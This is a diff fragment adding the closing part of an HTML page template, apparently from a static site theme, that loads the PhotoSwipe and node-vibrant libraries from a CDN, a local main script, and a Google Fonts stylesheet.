+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
